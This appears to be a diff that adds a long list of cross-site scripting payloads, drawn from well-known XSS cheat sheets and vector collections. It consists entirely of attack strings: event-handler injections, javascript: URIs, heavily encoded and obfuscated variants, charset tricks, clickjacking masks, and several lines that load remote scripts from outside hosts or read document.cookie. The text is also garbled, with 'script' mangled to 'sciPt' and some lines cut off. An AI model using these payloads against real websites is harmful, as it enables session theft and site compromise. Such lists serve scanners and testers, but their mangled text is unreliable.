+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+>>> vectors()
+<div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javasciPt:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf& ...
+<div id=\"28\">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[\"'`-->]]>]</div>
+<div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->
+<![><img src=\"]><img src=x onerror=alert(39)//\">
+<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+<div id=\"41\"><li style=list-style:url() onerror=alert(41)></li>
+<div id=\"42\"><head><base href=\"javasciPt://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>
+<head><style type=\"text/css\">@font-face {font-family: y; src: url(\"font.svg#x\") format(\"svg\");} body {font: 100px \"y\";}</style></head>
+<body>Hello</body>
+<div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>
+<sciPt src=\"javasciPt:alert(3)\"></sciPt> // IE6, O11.01, OM10.1//[\"'`-->]]>]</div>
+</svg>//[\"'`-->]]>]</div>
+<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">
+<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(94)</handler>
+<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">
+<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[\"'`-->]]>]</div>
+<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D1 ...
+<!-- IE 5-9 standards mode -->
+<?a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(3)//\">//[\"'`-->]]>]</div>
+<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">
+<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>
+<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"/>
+<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/ ...
+<t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;\">//[\"'`-->]]>]</div>
+<div id=\"117\"><a href=\"http://attacker.org\">
+<iframe src=\"http://example.org/\"></iframe>
+</a>//[\"'`-->]]>]</div>
+<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','malicious code');\"><h1>Drop me</h1></div>
+<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>
+<div id=\"119\"><iframe src=\"view-source:http://www.example.org/\" frameborder=\"0\" style=\"width:400px;height:180px\"></iframe>
+<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`-->]]>]</div>
+<div id=\"120\"><sciPt>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</sciPt>
+<body><a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>
+<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"
+xmlns:svg=\"http://www.w3.org/2000/svg\">
+<body style=\"background:gray\">
+<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>
+<svg:svg><svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\"><svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/><s ...
+<div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-sciPts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>
+<div id=\"123\"><span class=foo>Some text</span>
+<sciPt>$(\"span.foo\").click(function() {alert('foo');$(\"a.bar\").click();});$(\"a.bar\").click(function() {alert('bar');location=\"http://html5sec.org\";});</sciPt>//[\"'`-->]]>]</div>
+<sciPt src=\"\\example.com\foo.js\"></sciPt> // Safari 5.0//[\"'`-->]]>]</div>
+<div id=\"125\"><?xml version=\"1.0\"?>
+<?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?>
+<svg xmlns=\"http://www.w3.org/2000/svg\">
+<image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><sciPt>parent.alert(129)</sciPt></svg>\")'>
+<form>
+<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />
+<img alt='%></xmp><img src=xx:x onerror=aler
+<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if>
+<circle r=\"400\"></circle>
+<div style=xss:expression(1)-alert(1)>
+<IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onresize=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onreset=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onclick=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\">
+<IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\">
+\"><h1><iframe width=\"420\" height=\"315\" src=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" allowfullscreen></iframe>123</h1>
+<iframe src=http://xss.rocks/sciPtlet.html <
+<iframe  src=\"&Tab;javasciPt:prompt(1)&Tab;\">
+<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<sciPt /**/>/**/alert(1)/**/</sciPt /**/
+http://www.google<sciPt .com>alert(document.location)</sciPt
+<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<sciPt ^__^>alert(String.fromCharCode(49))</sciPt ^__^
+</style &#32;><sciPt &#32; :-(>/**/alert(document.location)/**/</sciPt &#32; :-(
+&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<sciPt /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</sciPt /***/
+<sciPt ~~~>alert(0%0)</sciPt ~~~>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<sciPt/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></sciPt
+<sciPt/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></sciPt>
+<object src=1 href=1 onerror=\"javasciPt:alert(1)\"></object>
+<body onFocus body onFocus=\"javasciPt:javasciPt:alert(1)\"></body onFocus>
+<style onLoad style onLoad=\"javasciPt:javasciPt:alert(1)\"></style onLoad>
+<sciPt onLoad sciPt onLoad=\"javasciPt:javasciPt:alert(1)\"></sciPt onLoad>
+<html onMouseOver html onMouseOver=\"javasciPt:javasciPt:alert(1)\"></html onMouseOver>
+<html onMouseEnter html onMouseEnter=\"javasciPt:parent.javasciPt:alert(1)\"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload=\"javasciPt:javasciPt:alert(1)\"></body onBeforeUnload>
+<html onMouseDown html onMouseDown=\"javasciPt:javasciPt:alert(1)\"></html onMouseDown>
+<marquee onScroll marquee onScroll=\"javasciPt:javasciPt:alert(1)\"></marquee onScroll>
+<body onPopState body onPopState=\"javasciPt:javasciPt:alert(1)\"></body onPopState>
+<applet onreadystatechange applet onreadystatechange=\"javasciPt:javasciPt:alert(1)\"></applet onreadystatechange>
+<body onbeforeunload body onbeforeunload=\"javasciPt:javasciPt:alert(1)\"></body onbeforeunload>
+<body onfocus body onfocus=\"javasciPt:javasciPt:alert(1)\"></body onfocus>
+<iframe onbeforeload iframe onbeforeload=\"javasciPt:javasciPt:alert(1)\"></iframe onbeforeload>
+<iframe src iframe src=\"javasciPt:javasciPt:alert(1)\"></iframe src>
+<svg onload svg onload=\"javasciPt:javasciPt:alert(1)\"></svg onload>
+--><!-- ---> <img src=xxx:x onerror=javasciPt:alert(1)> -->
+\"><img src=x onerror=javasciPt:alert('1')>
+\"><img src=x onerror=javasciPt:alert(A)>
+<body oninput=javasciPt:alert(1)><input autofocus>
+<math href=\"javasciPt:javasciPt:alert(1)\">CLICKME</math>  <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javasciPt:javasciPt:alert(1)\">CLICKME</maction> </math>
+<img src=\"javasciPt:alert(1)\">
+<img src onerror /\" '\"= alt=javasciPt:alert(1)//\">
+<title onpropertychange=javasciPt:alert(1)></title><title title=>
+<sciPt src=\"\\%(jsciPt)s\"></sciPt>
+<meta charset=\"x-imap4-modified-utf7\">&<sciPt&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/sciPt&X&>
+<meta charset=\"mac-farsi\">¼sciPt¾javasciPt:alert(1)¼/sciPt¾
+X<x style=`behavior:url(#default#time2)` onbegin=`javasciPt:alert(1)` >
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javasciPt:alert(1)&gt;`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javasciPt:alert(1)&gt;>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javasciPt:javasciPt:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javasciPt:javasciPt:alert(1)\">XXX</a>
+<x style=\"behavior:url(%(sct)s)\">
+<xml id=\"xss\" src=\"%(htc)s\"></xml> <label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>
+<event-source src=\"%(event)s\" onload=\"javasciPt:alert(1)\">
+<a href=\"javasciPt:javasciPt:alert(1)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\">
+<div id=\"x\">x</div> <xml:namespace prefix=\"t\"> <import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;on ...
+<sciPt>%(payload)s</sciPt>
+<sciPt language='javasciPt' src='%(jsciPt)s'></sciPt>
+<sciPt>javasciPt:alert(1)</sciPt>
+<IMG SRC=\"javasciPt:javasciPt:alert(1);\">
+<IMG SRC=\"jav asciPt:javasciPt:alert(1);\">
+<XSS STYLE=\"behavior: url(%(htc)s);\">
+<BASE HREF=\"javasciPt:javasciPt:alert(1);//\">
+<OBJECT TYPE=\"text/x-sciPtlet\" DATA=\"%(sciPtlet)s\"></OBJECT>
+<P STYLE=\"behavior:url('#default#time2')\" end=\"0\" onEnd=\"javasciPt:alert(1)\">
+<STYLE>a{background:url('s1' 's2)}@import javasciPt:javasciPt:alert(1);');}</STYLE>
+<SCRIPT onreadystatechange=javasciPt:javasciPt:alert(1);></SCRIPT>
+<style onreadystatechange=javasciPt:javasciPt:alert(1);></style>
+<?xml version=\"1.0\"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:sciPt>javasciPt:alert(1);</html:sciPt></html:html>
+<embed code=%(sciPtlet)s></embed>
+<embed src=%(jsciPt)s></embed>
+<embed width=500 height=500 code=\"data:text/html,<sciPt>%(payload)s</sciPt>\"></embed>
+<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javasciPt:alert(1)&amp;gt;>\">
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";
+<IMG onmouseover=\"alert('xxs')\">
+<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>
+<A HREF=\"http://66.102.7.147/\">XSS</A>
+<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>
+<A HREF=\"http://1113982867/\">XSS</A>
+<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>
+<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>
+<A HREF=\"htt p://6 6.000146.0x7.147/\">XSS</A>
+<svg><sciPt xlink:href=data&colon;,window.open('https://www.google.com/')></sciPt
+<form><a href=\"javasciPt:\u0061lert&#x28;1&#x29;\">X
+</sciPt><img/*/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/*/onerror='eval(src)'>
+
+'>//\\,<'>\">\">\"*\"
+'); alert('XSS
+<scr<sciPt>ipt>alert('XSS');</scr</sciPt>ipt>
+<sciPt>alert(String.fromCharCode(88,83,83))</sciPt> 
+<img src=foo.png onerror=alert(/xssed/) />
+window.alert(\"Bonjour !\");
+</sciPt><sciPt>alert(1)</sciPt>
+a=\"get\";b=\"URL\";c=\"javasciPt:\";d=\"alert('xss');\";eval(a+b+c+d);
+='><sciPt>alert(\"xss\")</sciPt>
+<sciPt+src=\">\"+src=\"http://yoursite.com/xss.js?69,69\"></sciPt>
+<body background=javasciPt:'\"><sciPt>alert(navigator.userAgent)</sciPt>></body>
+\">/XaDoS/><sciPt>alert(document.cookie)</sciPt><sciPt src=\"http://www.site.com/XSS.js\"></sciPt>
+\">/KinG-InFeT.NeT/><sciPt>alert(document.cookie)</sciPt>
+src=\"http://www.site.com/XSS.js\"></sciPt>
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+!--\" /><sciPt>alert('xss');</sciPt>
+<sciPt>alert(\"XSS by \nxss\")</sciPt><marquee><h1>XSS by xss</h1></marquee>
+'\"></title><sciPt>alert(\"XSS by \nxss\")</sciPt>><marquee><h1>XSS by xss</h1></marquee>
+>\"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javasciPt:alert(&apos;XSS&apos;))&quot;&gt;
+&lt;IMG SRC=javasciPt:alert(&apos;XSS&apos;)&gt;
+&lt;IMG DYNSRC=&quot;javasciPt:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG LOWSRC=&quot;javasciPt:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+&lt;STYLE&gt;li {list-style-image: url(&quot;javasciPt:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javasciPt:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javasciPt:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;TABLE BACKGROUND=&quot;javasciPt:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp ...
+&lt;IMG SRC=&quot;jav&amp;#x0D;asciPt:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&ap ...
+&lt;IMG SRC=&quot; &amp;#14;  javasciPt:alert(&apos;XSS&apos;);&quot;&gt;
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+&lt;IMG SRC=&quot;javasciPt:alert(&apos;XSS&apos;)&quot;
+&lt;IFRAME SRC=http://ha.ckers.org/sciPtlet.html &lt;
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;SCRIPT&gt;a=/XSS/
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+</title><SCRIPT>document.vulnerable=true;</sciPt>
+<FRAMESET><FRAME SRC=\"javasciPt:document.vulnerable=true;\"></frameset>
+<div STYLE=\"background-image: url(&#1;javasciPt:document.vulnerable=true;)\">
+<div STYLE=\"width: expression(document.vulnerable=true);\">
+<img STYLE=\"xss:expr/*XSS*/ession(document.vulnerable=true)\">
+<XSS STYLE=\"xss:expression(document.vulnerable=true)\">
+<style TYPE=\"text/javasciPt\">document.vulnerable=true;</style>
+<base HREF=\"javasciPt:document.vulnerable=true;//\">
+<meta HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>document.vulnerable=true</SCRIPT>\">
+<a href=\"javasciPt#document.vulnerable=true;\">
+<iframe src=\"vbsciPt:document.vulnerable=true;\">
+<meta http-equiv=\"refresh\" content=\"0;url=javasciPt:document.vulnerable=true;\">
+<object classid=\"clsid:...\" codebase=\"javasciPt:document.vulnerable=true;\">
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+<style>BODY{-moz-binding:url(\"http://www.securitycompass.com/xssmoz.xml#xss\")}</style>
+<sciPt =\">\" SRC=\"http://www.securitycompass.com/xss.js\"></sciPt>
+<sciPt a=`>` SRC=\"http://www.securitycompass.com/xss.js\"></sciPt>
+<sciPt a=\">'>\" SRC=\"http://www.securitycompass.com/xss.js\"></sciPt>
+<;BGSOUND SRC=\";javasciPt:alert(';XSS';);\";>;
+<;IMG SRC=javasciPt:alert(';XSS';)>;
+<;STYLE>;li {list-style-image: url(\";javasciPt:alert(&#39;XSS&#39;)\";);}<;/STYLE>;<;UL>;<;LI>;XSS
+<;IMG SRC=';vbsciPt:msgbox(\";XSS\";)';>;
+<;IMG SRC=\";livesciPt:[code]\";>;
+<;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0;url=javasciPt:alert(';XSS';);\";>;
+<;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\";>;
+<;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0; URL=http://;URL=javasciPt:alert(';XSS';);\";>;
+<;IMG SRC=\";mocha:[code]\";>;
+<;OBJECT TYPE=\";text/x-sciPtlet\"; DATA=\";http://ha.ckers.org/sciPtlet.html\";>;<;/OBJECT>;
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javasciPt:alert(';XSS';)>;<;/OBJECT>;
+<;EMBED SRC=\";http://ha.ckers.org/xss.swf\"; AllowScriptAccess=\";always\";>;<;/EMBED>;
+a=\";get\";;&;#10;b=\";URL(\";\";;&;#10;c=\";javasciPt:\";;&;#10;d=\";alert(';XSS';);\";)\";;&#10;eval(a+b+c+d);
+<;STYLE TYPE=\";text/javasciPt\";>;alert(';XSS';);<;/STYLE>;
+<;IMG STYLE=\";xss:expr/*XSS*/ession(alert(';XSS';))\";>;
+<;XSS STYLE=\";xss:expression(alert(';XSS';))\";>;
+<;STYLE>;.XSS{background-image:url(\";javasciPt:alert(';XSS';)\";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+<;STYLE type=\";text/css\";>;BODY{background:url(\";javasciPt:alert(';XSS';)\";)}<;/STYLE>;
+<;LINK REL=\";stylesheet\"; HREF=\";javasciPt:alert(';XSS';);\";>;
+<;LINK REL=\";stylesheet\"; HREF=\";http://ha.ckers.org/xss.css\";>;
+<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
+<;META HTTP-EQUIV=\";Link\"; Content=\";<;http://ha.ckers.org/xss.css>;; REL=stylesheet\";>;
+<;STYLE>;BODY{-moz-binding:url(\";http://ha.ckers.org/xssmoz.xml#xss\";)}<;/STYLE>;
+<;TABLE BACKGROUND=\";javasciPt:alert(';XSS';)\";>;<;/TABLE>;
+<;HTML xmlns:xss>;
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=\";javas]]>;<;![CDATA[cript:alert(';XSS';);\";>;]]>;
+<;IMG SRC=javasciPt:alert(&;quot;XSS&;quot;)>;
+\";;alert(';XSS';);//
+<;SCRIPT =\";blah\"; SRC=\";http://ha.ckers.org/xss.js\";>;<;/SCRIPT>;
+<;SCRIPT a=\";blah\"; ';'; SRC=\";http://ha.ckers.org/xss.js\";>;<;/SCRIPT>;
+<;SCRIPT>;document.write(\";<;SCRI\";);<;/SCRIPT>;PT SRC=\";http://ha.ckers.org/xss.js\";>;<;/SCRIPT>;
+<;A HREF=\";http://1113982867/\";>;XSS<;/A>;
+<;A HREF=\";http://0102.0146.0007.00000223/\";>;XSS<;/A>;
+<;A HREF=\";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/\";>;XSS<;/A>;
+<;A HREF=\";//google\";>;XSS<;/A>;
+<;A HREF=\";http://google.com/\";>;XSS<;/A>;
+>%22%27><img%20src%3d%22javasciPt:alert(%27%20XSS%27)%22>
+\">
+<sciPt>alert('XSS')</sciPt>
+<IMG SRC=javasciPt:alert('XSS')>       
+%253csciPt%253ealert(1)%253c/sciPt%253e
+foo<sciPt>alert(1)</sciPt>
+<img%20src=\"\"\">
+<IMG SRC=\"/\" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=\"/x\" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088& ...
+<IMG SRC=\"/\" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=\"/x\" onerror=\"jav      asciPt:alert('XSS');\">
+<IMG SRC=\"/\" onerror=\"jav&#x09;asciPt:alert('XSS');\">
+<IMG SRC=\"/x\" onerror=\"jav&#x0D;asciPt:alert('XSS');\">
+<IMG SRC=\"/x\" onerror=\"jav%00asciPt:alert('XSS');\">
+<IMG SRC=\"/x\" onerror=\" &#14;  javasciPt:alert('XSS');\">
+<BGSOUND SRC=\"javasciPt:alert('XSS');\"
+<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"
+<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->
+<EMBED SRC=\"http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=\"never\" and allownetworking=\"in ...
+<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>
+<XML SRC=\"xsstest.xml\" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<math href=\"javasciPt:javasciPt:alert(1)\">CLICKME</math> <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javasciPt:javasciPt:alert(1)\">CLICKME</maction> </math>
+<div id=\"x\">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>
+<sciPt>alert(1)%0d%0a-->%09</sciPt
